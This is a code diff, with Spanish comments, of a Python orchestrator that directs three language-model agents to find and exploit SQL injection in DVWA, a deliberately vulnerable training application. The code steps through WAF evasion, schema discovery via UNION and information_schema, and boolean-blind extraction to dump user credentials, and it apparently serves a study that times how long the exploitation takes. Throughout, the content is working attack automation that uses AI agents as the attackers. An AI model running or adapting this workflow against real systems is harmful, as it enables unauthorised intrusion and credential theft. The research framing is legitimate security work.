@@ -1,13 +1,3 @@
-"""Orchestrator: coordina a los tres agentes para explotar una SQL injection SIN conocer el esquema.
-
-Flujo (como un pentester real, todo averiguado por comandos, nada hardcodeado):
-  1. Login y fijar el nivel de seguridad.
-  2. El Planner plantea la metodología (UNION-based sobre MySQL), sin asumir tablas ni columnas.
-  3. El descubrimiento (determinista + evasión de WAF) averigua: contexto de comillas, nº de
-     columnas, columnas reflejadas, tablas y columnas — vía ORDER BY e information_schema.
-  4. El Analyst decide cuáles columnas descubiertas son usuario/contraseña.
-  5. El Executor GENERA el payload de extracción desde ese esquema (con respaldo determinista).
-  6. Se extraen las credenciales. Se mide el tiempo hasta la explotación (métrica del estudio)."""
 from __future__ import annotations
 
 import time
@@ -23,11 +13,10 @@ from .recon import TechniqueSelector
 from .types import RunResult
 
 Logger = Optional[Callable[[str], None]]
-_RECON_BUDGET = 90   # sondeos del reconocimiento (presupuesto propio, no gasta los pasos del ataque)
+_RECON_BUDGET = 90
 
 
 def _valid_dump(crafted: dict, table: str, cred_columns: tuple[str, str]) -> bool:
-    """Valida el payload que generó el LLM; si no sirve, se usa el determinista."""
     p = str(crafted.get("payload", "")).strip().lower()
     if not p:
         return False
@@ -38,7 +27,7 @@ def _valid_dump(crafted: dict, table: str, cred_columns: tuple[str, str]) -> boo
 class Orchestrator:
     def __init__(self, llm: OllamaClient, dvwa: DVWAClient) -> None:
         self.dvwa = dvwa
-        self.llm = llm   # compartido por los 3 agentes; de aquí salen las métricas de costo del SLM
+        self.llm = llm
         self.planner = Planner("Planner", "planner.md", llm)
         self.executor = Executor("Executor", "executor.md", llm)
         self.analyst = Analyst("Analyst", "analyst.md", llm)
@@ -59,23 +48,19 @@ class Orchestrator:
         self.dvwa.set_security(level)
         say(f"[Orchestrator] login ok, nivel de seguridad '{level}'")
 
-        # Reconoce el punto de inyección leyendo el formulario de la página (parámetro + método HTTP),
-        # en vez de asumirlos.
         inj_trace: list[str] = []
         if hasattr(self.dvwa, "detect_injection_point"):
             ip = self.dvwa.detect_injection_point(level)
             say(f"[Recon] punto de inyección: parámetro {ip['param']!r} (método HTTP {ip['method']})")
             inj_trace = [f"punto de inyección: parámetro {ip['param']} (método {ip['method']})"]
 
-        engine = EvasionEngine()            # motor del ATAQUE
-        recon_engine = EvasionEngine()      # motor del RECONOCIMIENTO (aparte, no gasta pasos del ataque)
+        engine = EvasionEngine()
+        recon_engine = EvasionEngine()
         counter = {"steps": 0}
         recon_counter = {"steps": 0}
-        payload_log: list[dict] = []        # cada payload que se envía, con su estado (auditoría/export)
+        payload_log: list[dict] = []
 
         def _probe(base_sql: str, eng: EvasionEngine, cnt: dict, budget: int) -> ProbeResult:
-            # Envío consciente del WAF: escala disfraces hasta que uno pasa (o se agota la escalera).
-            # El bloqueo se resume en UNA línea por sondeo (no una por cada intento), para no inundar.
             blocked = 0
             while True:
                 if cnt["steps"] >= budget or time.monotonic() > deadline:
@@ -112,15 +97,11 @@ class Orchestrator:
             _probe(base_sql, recon_engine, recon_counter, _RECON_BUDGET)
             return time.monotonic() - t0
 
-        # El Planner plantea la metodología (no asume esquema).
         strategy = str(self.planner.plan(level).get("strategy", ""))
         say(f"[Planner] {strategy}")
 
-        # RECONOCIMIENTO: elige la técnica por observación (OWASP WSTG), ANTES de atacar — nunca
-        # por el nombre del WAF. Así no prueba una técnica tras otra: escoge la correcta de entrada.
         recon = TechniqueSelector(recon_probe, time_probe, say=say).select()
 
-        # El Analyst elige las columnas de credenciales; si falla, respaldo determinista.
         def pick(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
             picked = self.analyst.pick_credentials(table, columns)
             if picked and picked[0] in columns and picked[1] in columns:
@@ -134,7 +115,6 @@ class Orchestrator:
         trace: list[str] = [f"recon: señales={recon.signals} -> técnica elegida={recon.technique}"]
 
         if recon.technique == "union":
-            # Técnica elegida: UNION. Se descubre el esquema y se extrae por UNION.
             res = discovery.discover()
             trace = res.trace
             if res.cred_columns[0]:
@@ -152,15 +132,12 @@ class Orchestrator:
                     conf = "verificada" if res.verified else "sin verificar"
                     say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas "
                         f"(DBMS={res.dbms or '?'}, confirmada por {res.techniques}, extracción {conf})")
-            # Respaldo INFORMADO (no prueba a ciegas): solo si el reconocimiento ya vio que el
-            # booleano es viable.
             if not success and recon.signals.get("boolean"):
                 blind = self._run_blind(engine, level, deadline, counter, say, payload_log)
                 if blind:
                     extracted, success = [blind], True
                     trace.append(f"extracción boolean-blind (LIKE): {blind}")
         elif recon.technique == "boolean":
-            # Técnica elegida: boolean-blind. UNION no pasa el WAF -> se va directo a la ciega.
             say("[Recon] UNION no pasa el WAF; el booleano sí → extracción ciega directa "
                 "(sin intentar UNION)")
             blind = self._run_blind(engine, level, deadline, counter, say, payload_log)
@@ -188,8 +165,6 @@ class Orchestrator:
         )
 
     def _blind_oracle(self, engine, level, deadline, counter, payload_log):
-        """Oráculo sí/no para la extracción ciega: envía por el motor de evasión y devuelve True si
-        la condición inyectada fue verdadera (el objetivo devolvió fila)."""
         def oracle(payload: str) -> bool:
             while time.monotonic() < deadline:
                 p, pipe = engine.next_payload(payload)
@@ -208,36 +183,30 @@ class Orchestrator:
         return oracle
 
     def _run_blind(self, engine, level, deadline, counter, say, payload_log):
-        """Extracción boolean-blind: el orquestador arma el oráculo y los candidatos de columna; el
-        EXECUTOR genera la forma del ataque y maneja el BlindExtractor (herramienta) para extraer."""
         oracle = self._blind_oracle(engine, level, deadline, counter, payload_log)
         user_cands, pass_cands = self._credential_candidates(say)
-        like = self.executor.craft_blind(say)   # 1 llamada: el Executor GENERA la forma del ataque
-        for quote in ("", "'"):   # medium = entero (sin comilla); otros = cadena
+        like = self.executor.craft_blind(say)
+        for quote in ("", "'"):
             row = self.executor.extract_blind(oracle, quote, user_cands, pass_cands, like, say)
             if row:
                 return row
         return None
 
     def _credential_candidates(self, say: Logger) -> tuple[list[str], list[str]]:
-        """Nombres de columnas de credencial para la ruta ciega: el Analyst (LLM) los PROPONE y se
-        ATERRIZAN en la wordlist de sqlmap (solo nombres reales van primero). Respaldo determinista
-        si el LLM no responde."""
         try:
             users, passwords = self.analyst.guess_credential_columns()
         except Exception:
             users, passwords = [], []
         wl = {c.lower() for c in knowledge.common_columns()}
         def ground(names: list[str]) -> list[str]:
-            inwl = [n for n in names if n.lower() in wl]      # nombres del LLM que existen en sqlmap
-            extra = [n for n in names if n.lower() not in wl]  # el resto de lo propuesto por el LLM
+            inwl = [n for n in names if n.lower() in wl]
+            extra = [n for n in names if n.lower() not in wl]
             return inwl + extra
         users, passwords = ground(users), ground(passwords)
         if users and passwords:
             say(f"[Blind] columnas propuestas por el Analyst (LLM), aterrizadas en sqlmap: "
                 f"usuario≈{users[:4]} password≈{passwords[:4]}")
             return users, passwords
-        # Respaldo determinista: wordlist de sqlmap (o lista mínima si falta el dataset).
         fu, fp = knowledge.credential_column_candidates()
         say("[Blind] Analyst sin respuesta → respaldo determinista (wordlist de sqlmap)")
         return (users or fu), (passwords or fp)
